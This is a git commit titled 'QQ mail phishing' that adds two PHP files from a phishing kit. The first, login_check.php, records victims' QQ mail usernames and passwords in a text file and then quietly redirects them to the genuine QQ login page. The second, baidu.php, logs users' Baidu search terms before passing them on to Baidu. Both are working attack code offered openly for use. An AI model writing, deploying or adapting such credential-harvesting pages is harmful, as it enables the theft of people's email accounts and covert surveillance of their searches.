678fb82031d12ecc206c38c64f5d687d8276a4e9
echo_hun <echo_hun@foxmail.com>
2018-05-22 15:44:34 +0800

    qq邮箱钓鱼

---
+++ 钓鱼/qq邮箱钓鱼前端+后端全代码/mailqq/login_check.php
@@ -0,0 +1,15 @@
+﻿<?php
+
+$username = $_REQUEST['username'];
+$password = $_REQUEST['password'];
+
+$log = fopen("save/mailqq.txt", "a");
+fwrite($log, $username ."  ".$password. "\r\n");
+fclose($log);
+
+
+echo '<script language="javascript">';
+echo "location.href='https://mail.qq.com/cgi-bin/loginpage'";
+echo '</script>';
+
+?>
---
+++ 钓鱼/百度搜索钓鱼前端+后端全代码/baidu.php
@@ -0,0 +1,15 @@
+﻿<?php
+
+$wd = urlencode($_REQUEST['wd']);
+$log = fopen("baidu_search.txt", "a");
+fwrite($log, $wd . "\r\n");
+fclose($log);
+
+#echo $wd;
+
+echo '<script language="javascript">';
+echo "location.href='https://www.baidu.com/s?wd=".$wd."&rsv_spt=1&rsv_iqid=0xcd9013d50001ba80&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_sug3=5&rsv_sug1=2&rsv_sug7=100&rsv_sug2=0&inputT=805&rsv_sug4=816'";
+echo '</script>';
+
+
+?>
